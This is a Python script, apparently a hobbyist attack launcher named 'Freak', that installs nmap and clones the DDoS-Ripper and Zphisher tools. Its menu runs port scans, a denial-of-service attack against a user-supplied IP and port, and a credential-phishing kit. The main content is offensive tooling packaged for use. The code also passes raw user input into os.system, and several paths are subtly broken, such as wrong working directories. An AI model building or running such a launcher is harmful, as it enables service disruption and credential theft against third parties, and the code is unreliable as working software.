import os
import time
import subprocess
import shutil
# Define commands and repo paths
tools = {
    "nmap": {"type": "apt", "package": "nmap"},
    "wget": {"type": "apt", "package": "wget"},
    "DDos-Ripper": {
        "type": "git",
        "repo": "https://github.com/palahsu/DDoS-Ripper.git",
        "path": "/opt/DDoS-Ripper"
    },
    "Zphisher": {
        "type": "git",
        "repo": "https://github.com/htr-tech/zphisher.git",
        "path": "/opt/zphisher"
    }
}

def is_installed(command):
    return shutil.which(command) is not None

def install_apt(package):
    print(f"[+] Installing {package} via apt...")
    subprocess.run(["apt", "update"], check=True)
    subprocess.run(["apt", "install", "-y", package], check=True)

def clone_repo(name, repo_url, path):
    if os.path.isdir(path):
        print(f"[✓] {name} is already cloned at {path}")
    else:
        print(f"[+] Cloning {name} from {repo_url}...")
        subprocess.run(["git", "clone", repo_url, path], check=True)

def main():
    for name, info in tools.items():
        print(f"\n[?] Checking {name}...")
        if info["type"] == "apt":
            if is_installed(info["package"]):
                print(f"[✓] {name} is already installed.")
            else:
                install_apt(info["package"])
        elif info["type"] == "git":
            clone_repo(name, info["repo"], info["path"])
        else:
            print(f"[!] Unknown type for {name}.")

    print("\n[✔] All tools are installed or available.")

if __name__ == "__main__":
    main()
while True:    
    os.system("clear")
    print("███████╗██████╗░███████╗░█████╗░██╗░░██╗")
    print("██╔════╝██╔══██╗██╔════╝██╔══██╗██║░██╔╝")
    print("█████╗░░██████╔╝█████╗░░███████║█████═╝░")
    print("██╔══╝░░██╔══██╗██╔══╝░░██╔══██║██╔═██╗░")
    print("██║░░░░░██║░░██║███████╗██║░░██║██║░╚██╗")
    print("╚═╝░░░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝")
    print("                      TOOL MADE BY apexvr_ ON TIKTOK")
    print("")
    print("1. Nmap Scan")
    print("2. DDoS (DDoS Ripper)")
    print("3. Zphisher")
    print("98. Update dependencies")
    print("99. Update Freak")
    print("00. Exit")
    freakchoice = int(input(">>> "))
    if freakchoice == 98:
        packages_to_update = ["nmap", "wget", "python3", "python", "git"]
    
        print("\n[-] Checking and updating the following packages if new versions exist:")
        for pkg in packages_to_update:
            print(f"  - {pkg}")
            time.sleep(0.7)
    
        try:
            print("\n[+] Updating package lists...")
            subprocess.run(["apt", "update"], check=True)
    
            print("[+] Upgrading selected packages...")
            for pkg in packages_to_update:
                print(f"  -> Upgrading {pkg} (if available)...")
                subprocess.run(["apt", "install", "--only-upgrade", "-y", pkg], check=True)
    
            print("\n[-] Update check complete. Packages are up to date.")
        except subprocess.CalledProcessError as e:
            print(f"[!] Error during update: {e}")
    elif freakchoice == 2:
        IPDDOS = input("TARGET IP: ")
        PORTDDOS = int(input("OPEN PORT: "))
        print("Press CTRL + C to break")
        time.sleep(2)
        os.system(f"python3 DRipper.py -s {IPDDOS} -p {PORTDDOS} -t 443")
    elif freakchoice == 1:
        IP = input("TARGET IP: ")
        METHOD = input("SCAN METHOD (sT, sS, Pn...): ")
        os.system(f"nmap -{METHOD} {IP}")
        time.sleep(5)
    elif freakchoice == 3:
        zphisher = os.path.join(os.getcwd(), "zphisher")
        os.chdir(zphisher)
        os.system("chmod +x zphisher.sh")
        os.system("bash zphisher.sh")
    elif freakchoice == 99:
        home = os.path.expanduser("~")
        repo_path = os.path.join(home, "FreakForLinux")
        if os.path.exists(repo_path):
            os.chdir(repo_path)
            subprocess.run(["git", "pull"])
            time.sleep(2)
        else:
            os.chdir(home)
            subprocess.run(["git", "clone", "https://github.com/Apex-Arch/FreakForLinux.git"])
            os.chdir(repo_path)
            subprocess.run(["python3", "Freak.py"])
            time.sleep(2)
    elif freakchoice == 00:
        print("[-] Exiting...")
        time.sleep(0.7)
        break
    else:
        print("[!] invalid input!")
        
